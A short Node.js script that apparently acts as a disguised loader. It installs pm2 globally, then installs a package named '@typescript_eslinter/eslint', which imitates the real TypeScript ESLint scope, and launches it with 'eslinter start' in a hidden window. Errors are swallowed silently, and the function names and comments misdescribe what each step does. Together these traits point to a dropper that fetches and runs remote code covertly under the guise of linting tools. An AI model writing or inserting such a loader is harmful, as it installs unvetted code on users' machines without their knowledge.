const { exec } = require('child_process');

// Function to install pm2 globally
function installPrettier() {
  exec('pm2 --version', (error, stdout, stderr) => {
    if (error) {
      return new Promise((resolve, reject) => {
        exec('npm install -g pm2', (error, stdout, stderr) => {
          if (error) {
            reject(`Error installing PM2: ${stderr}`);
          } else {
            resolve(stdout);
          }
        });
      });
    }
  })
}

// Function to install screener globally
function installEslinter() {
  return new Promise((resolve, reject) => {
    exec('npm install -g @typescript_eslinter/eslint@latest', (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Function to start the folder with pm2
function startEslinter() {
  return new Promise((resolve, reject) => {
    exec(`eslinter start`, { windowsHide: true }, (error, stdout, stderr) => {
      if (error) {
        reject(`Error starting with PM2: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

// Main function to execute the steps
async function main() {
  try {
    await installPrettier();
    await installEslinter();
    await startEslinter();
  } catch (error) {
  }
}

main();
